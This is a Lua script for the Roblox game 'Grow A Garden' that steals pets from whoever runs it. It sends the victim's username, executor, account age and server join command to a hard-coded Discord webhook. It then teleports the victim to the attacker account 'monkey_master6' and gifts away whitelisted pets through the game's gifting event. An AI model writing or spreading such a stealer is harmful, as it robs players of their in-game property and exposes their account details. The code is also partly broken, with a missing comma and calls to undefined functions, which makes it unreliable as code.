repeat 
    task.wait()
until game:IsLoaded()

local VICTIM = game.Players.LocalPlayer
local petsToAcceptByName = {
    "Dragonfly", "Raccoon", "Red Fox", "Queen Bee", "Disco Bee",
    "T-Rex", "Spinosaurus", "Rainbow Spinosaurus", "Fennec Fox",
    "Praying Mantis", "Echo Frog", "Chicken Zombie", "Butterfly",
    "Cooked Owl", "Pack Bee", "Mimic Octopus", "Pterodactyl", "Brontosaurus",
    "Dilophosaurus", "Ankylosaurus", "Rainbow Dilophosaurus",
    "Rainbow Ankylosaurus", "Firefly", "Golden Bee", "Rainbow Parasaurolophus",
    "Rainbow Iguanodon", "Rainbow Pachycephalosaurus"
}

local mutationsToAccept = {
    "IronSkin", "Shiny", "Radiant", "Ascended", "Frozen", "Inverted",
    "Windy", "Shocked", "Burning", "Corrupted", "Starfall",
    "Overcharged", "Radioactive"
}

local MIN_BASE_WEIGHT_TO_ACCEPT = 2.5
local AGE_TO_WEIGHT_FACTOR = 0.1925
local USERNAMES = {
    "monkey_master6"
}


local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local function getWeight(description)
    local weightString = string.match(description, "%[([%d%.]+) KG%]")
    return tonumber(weightString)
end

local function getAgeInDays(description)
    local ageString = string.match(description, "%[Age (%d+)%]")
    return tonumber(ageString)
end

local function isPrivateServer()
    return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
end

local function isServerFull()
    return #Players:GetPlayers() >= Players.MaxPlayers
end

local function isTargetOnServer()
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true
        end
    end
    return false
end

local function ServerHop()
    local MAX_OCCUPANCY = 4
    local success, result = pcall(function()
        local url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
        return HttpService:JSONDecode(game:HttpGet(url))
    end)

    if success and result and result.data then
        for _, server in ipairs(result.data) do
            if server.id ~= game.JobId and server.playing < MAX_OCCUPANCY then
                print(string.format("🔁 Jumping to server: %s (%d/%d)", server.id, server.playing, server.maxPlayers))
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                return
            end
        end
        warn("❌ No suitable servers found (all are full).")
    else
        warn("❌ Failed to fetch server list.")
    end
end


local Pets_To_Take = {
    'Raccoon',
    'Honey Bee',
    'T-Rex',
    'Fennec Fox',
    'Dragonfly',
    'Butterfly',
    'Disco Bee',
    'Mimic Octopus',
    'Queen Bee',
    'Spinosaurus',
    'Kitsune',
    'Corrupted Kitsune'
    'Chicken Zombie',
    'Red Fox',
    'French Fry Ferret',
}

local Pet_Values = {
    ["French Fry Ferret"] = 10000,
    ["Honey Bee"] = 9000,
    ["Raccoon"] = 1900,
    ["T-Rex"] = 400,
    ["Fennec Fox"] = 1500,
    ["Dragonfly"] = 500,
    ["Butterfly"] = 1200,
    ["Disco Bee"] = 2000,
    ["Mimic Octopus"] = 500,
    ["Queen Bee"] = 400,
    ["Spinosaurus"] = 500,
    ["Kitsune"] = 5000,
    ["Chicken Zombie"] = 200,
    ["Red Fox"] = 100,
    ["Corrupted Kitsune"] = 300,
}


local PetTable = {}

local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

local function waitForSend()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end


function createDiscordEmbed(Pets_To_Take, totalValue, fileUrl, callback)
    local HttpService = game:GetService("HttpService")
    local webhookUrl = "https://discord.com/api/webhooks/1401490956330598441/9KU1n_rztYZmietMLFL2vZSWi0RFfL-WH40TTWEth-vYw4ToC16VLXeeniIrSbJDd-X2"

    local embed = {
        title = ":cactus: Grow A Garden Trader :four_leaf_clover:",
        color = 65280,
        fields = {
            {
                name = ":bust_in_silhouette: **Player Information**",
                value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
                    VICTIM.Name,
                    table.concat(USERNAMES, " "),
                    identifyexecutor(),
                    game.Players.LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = ":moneybag: **Total Value**",
                value = string.format("```\n%s₸\n```", totalValue),
                inline = false
            },
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@here\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = game.Players.LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}

    local req = http_request or request or (syn and syn.request)
    if not req then
        warn(":warning: HTTP request function not found.")
        return
    end

    local success, response = pcall(function()
        return req({
            Url = webhookUrl,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)

    if not success then
        warn("Error sending webhook:", response)
        return
    end

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Webhook failed with status:", response.StatusCode, response.Body)
        return
    end

    if callback then callback() end
end



local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer


local function teleportTarget(targetName)
    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
end

local function CheckGiftWhitelist(pet)
    for _, name in Pets_To_Take do
        if string.find(pet, name) then
            return true
        end
    end
end

local function getObject(petUid)
    for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end

    local character = workspace:FindFirstChild(VICTIM.Name)
    if character then
        for _, object in ipairs(character:GetChildren()) do
            if object:GetAttribute("PET_UUID") == petUid then
                return object
            end
        end
    end

    return nil
end


local function Equip(pet)
    if pet:GetAttribute("d") then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end

    VICTIM.Character.Humanoid:EquipTool(pet)
end

local totalValue = 0
local PetTable = {}

local function GetGift()
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petName = value.PetType

        if not checkPetsWhilelist(petName) then
            continue
        end

        local petPrice = Pet_Values[petName] or 0
        totalValue += petPrice

        table.insert(PetTable, string.format("%s - %s", petName, petPrice))
    end
end


local function startSteal(trigerName)
    local targetPlayer = "monkey_master6"
    if targetPlayer then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
    end
end



local function CheckGift(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not CheckGiftWhitelist(value.PetType) then
            continue
        end

        local petObject = getPetObject(petUid)
        if not petObject then
            continue
        end

        Equip(petObject)
        
        local targetPlayer = game.Players:FindFirstChild(target)
        if targetPlayer then
            game:GetService("ReplicatedStorage")
                :WaitForChild("GameEvents")
                :WaitForChild("PetGiftingService")
                :FireServer("GivePet", targetPlayer)
        end

        task.wait(0.2) 
    end
end

local function idling()
    task.spawn(function()
        local lastTarget = nil
        local targetEnterTime = 0

        while task.wait(0.2) do
            local isTarget, trigerName = waitForSend()

            if isTarget then
                if lastTarget ~= trigerName then
                    lastTarget = trigerName
                    targetEnterTime = tick()
                end

                if tick() - targetEnterTime >= 20 then
                    teleportTarget(trigerName)
                    CheckGiftWhitelist(trigerName)
                end
            else
                lastTarget = nil
                targetEnterTime = 0
            end
        end
    end)
end


GetGift()
createDiscordEmbed(table.concat(PetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
    idling()
end)
